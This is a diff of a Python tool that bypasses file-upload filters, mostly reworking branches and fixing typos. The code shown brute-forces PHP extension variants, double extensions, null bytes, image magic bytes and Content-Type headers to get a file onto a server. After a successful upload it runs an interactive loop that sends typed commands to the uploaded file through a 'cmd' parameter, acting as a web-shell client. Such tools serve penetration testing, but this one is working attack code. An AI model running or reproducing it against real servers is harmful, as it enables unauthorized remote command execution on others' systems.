@@ -17,7 +17,7 @@ from urllib import request
 def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location, username,
          password, data, file_attr):
 
-    # Basic Authentication 
+    # Basic Authentication
 
     sauce = urllib.request.urlopen(URL).read()
     soup = bs.BeautifulSoup(sauce, "html.parser")
@@ -43,7 +43,7 @@ def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_forc
 
 def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
                    session, data, file_attr):
-    
+
     # Brute forcing different extensions and uppercase extensions
 
     try:
@@ -110,17 +110,7 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
                     f = open("results.txt", "a")
                     f.write(f"File uploaded successfully with: {filename_ext}\n")
                     f.close()
-
-                else:
-                    print(f"[*] File uploaded successfully with: {filename_ext}")
-                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
-                    print("[*] Saved in results.txt")
-                    f = open("results.txt", "a")
-                    f.write(f"File uploaded successfully with: {filename_ext}\n")
-                    f.close()
-
-                if location != 'optional':
-
+                    
                     while True:
                         try:
                             command = input("└─$ ")
@@ -134,8 +124,16 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
                             print(response.text)
 
                         except KeyboardInterrupt:
-                            print("KeyboardInterrupt execption is caught!")
+                            print("KeyboardInterrupt exception is caught!")
                             break
+                
+                else:
+                    print(f"[*] File uploaded successfully with: {filename_ext}")
+                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
+                    print("[*] Saved in results.txt")
+                    f = open("results.txt", "a")
+                    f.write(f"File uploaded successfully with: {filename_ext}\n")
+                    f.close()
 
                 if verbosity:
                     print(response.text)
@@ -155,7 +153,7 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
 
 def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS, headers, brute_force, verbosity,
                      location, session, file_attr, data):
-    
+
     # Doubling the extension
 
     php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
@@ -204,16 +202,6 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
                 f.write(f"File uploaded successfully with: {filename_ext}\n")
                 f.close()
 
-            else:
-                print(f"[*] File uploaded successfully with: {filename_ext}")
-                print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
-                print("[*] Saved in results.txt")
-                f = open("results.txt", "a")
-                f.write(f"File uploaded successfully with: {filename_ext}\n")
-                f.close()
-
-            if location != 'optional':
-
                 while True:
                     try:
                         command = input("└─$ ")
@@ -222,14 +210,21 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
                         final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
                         response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
-                                               proxies=proxies,
-                                               verify=TLS)
+                                               proxies=proxies, verify=TLS)
                         print(f"URL is: {final_url}")
                         print(response.text)
 
                     except KeyboardInterrupt:
-                        print("KeyboardInterrupt execption is caught!")
+                        print("KeyboardInterrupt exception is caught!")
                         break
+                        
+            else:
+                print(f"[*] File uploaded successfully with: {filename_ext}")
+                print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
+                print("[*] Saved in results.txt")
+                f = open("results.txt", "a")
+                f.write(f"File uploaded successfully with: {filename_ext}\n")
+                f.close()
 
             if verbosity:
                 print(response.text)
@@ -246,7 +241,7 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
 
 def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
                session, file_attr, data):
-    
+
     # Adds null bytes to the end of extensions
 
     php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
@@ -297,6 +292,22 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
                     f.write(f"File uploaded successfully with: {filename_ext}\n")
                     f.close()
 
+                    while True:
+                        try:
+                            command = input("└─$ ")
+                            cmd_encoded = urllib.parse.quote(command)
+                            domain = urlparse(URL).netloc
+                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
+    
+                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
+                                                   proxies=proxies, verify=TLS)
+                            print(f"URL is: {final_url}")
+                            print(response.text)
+    
+                        except KeyboardInterrupt:
+                            print("KeyboardInterrupt exception is caught!")
+                            break
+                            
                 else:
                     print(f"[*] File uploaded successfully with: {filename_ext}")
                     print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
@@ -304,25 +315,6 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
                     f = open("results.txt", "a")
                     f.write(f"File uploaded successfully with: {filename_ext}\n")
                     f.close()
-
-                if location != 'optional':
-
-                    while True:
-                        try:
-                            command = input("└─$ ")
-                            cmd_encoded = urllib.parse.quote(command)
-                            domain = urlparse(URL).netloc
-                            final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
-
-                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
-                                                   proxies=proxies,
-                                                   verify=TLS)
-                            print(f"URL is: {final_url}")
-                            print(response.text)
-
-                        except KeyboardInterrupt:
-                            print("KeyboardInterrupt execption is caught!")
-                            break
 
                 if verbosity:
                     print(response.text)
@@ -352,7 +344,7 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
 
 def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
                 session, file_attr, data):
-    
+
     # Uploading files with image Magic Bytes
 
     php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
@@ -408,16 +400,6 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                     f.write(f"File uploaded successfully with: {filename_ext}\n")
                     f.close()
 
-                else:
-                    print(f"[*] File uploaded successfully with: {filename_ext}")
-                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
-                    print("[*] Saved in results.txt")
-                    f = open("results.txt", "a")
-                    f.write(f"File uploaded successfully with: {filename_ext}\n")
-                    f.close()
-
-                if location != 'optional':
-
                     while True:
                         try:
                             command = input("└─$ ")
@@ -426,14 +408,21 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
                             response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
-                                                   proxies=proxies,
-                                                   verify=TLS)
+                                                   proxies=proxies, verify=TLS)
                             print(f"URL is: {final_url}")
                             print(response.text)
 
                         except KeyboardInterrupt:
-                            print("KeyboardInterrupt execption is caught!")
+                            print("KeyboardInterrupt exception is caught!")
                             break
+                            
+                else:
+                    print(f"[*] File uploaded successfully with: {filename_ext}")
+                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
+                    print("[*] Saved in results.txt")
+                    f = open("results.txt", "a")
+                    f.write(f"File uploaded successfully with: {filename_ext}\n")
+                    f.close()
 
                 if brute_force:
                     break
@@ -476,16 +465,6 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                     f.write(f"File uploaded successfully with: {filename_ext}\n")
                     f.close()
 
-                else:
-                    print(f"[*] File uploaded successfully with: {filename_ext}")
-                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
-                    print("[*] Saved in results.txt")
-                    f = open("results.txt", "a")
-                    f.write(f"File uploaded successfully with: {filename_ext}\n")
-                    f.close()
-
-                if location != 'optional':
-
                     while True:
                         try:
                             command = input("└─$ ")
@@ -494,14 +473,21 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
                             response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
-                                                   proxies=proxies,
-                                                   verify=TLS)
+                                                   proxies=proxies, verify=TLS)
                             print(f"URL is: {final_url}")
                             print(response.text)
 
                         except KeyboardInterrupt:
-                            print("KeyboardInterrupt execption is caught!")
+                            print("KeyboardInterrupt exception is caught!")
                             break
+                            
+                else:
+                    print(f"[*] File uploaded successfully with: {filename_ext}")
+                    print(f"[*] You can access the uploaded file: {filename_ext}?cmd=command")
+                    print("[*] Saved in results.txt")
+                    f = open("results.txt", "a")
+                    f.write(f"File uploaded successfully with: {filename_ext}\n")
+                    f.close()
 
                 if verbosity:
                     print(response.text)
@@ -518,7 +504,7 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
 
 def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_force, verbosity, location, session,
                 file_attr, data):
-    
+
     # Trying different content types
 
     print("[-] Trying different content-type headers. Please be patient!")
@@ -554,15 +540,6 @@ def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_
                     f = open("results.txt", "a")
                     f.close()
 
-                else:
-                    print(f"[*] File uploaded successfully with Content-Type: {wordlist}")
-                    print("[*] Saved in results.txt")
-                    f = open("results.txt", "a")
-                    f.write(f"[*] File uploaded successfully with Content-Type: {wordlist}")
-                    f.close()
-
-                if location != 'optional':
-
                     while True:
                         try:
                             command = input("└─$ ")
@@ -577,8 +554,15 @@ def content_type(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_
                             print(response.text)
 
                         except KeyboardInterrupt:
-                            print("KeyboardInterrupt execption is caught!")
+                            print("KeyboardInterrupt exception is caught!")
                             break
+                            
+                else:
+                    print(f"[*] File uploaded successfully with Content-Type: {wordlist}")
+                    print("[*] Saved in results.txt")
+                    f = open("results.txt", "a")
+                    f.write(f"[*] File uploaded successfully with Content-Type: {wordlist}")
+                    f.close()
 
                 if verbosity:
                     print(response.text)
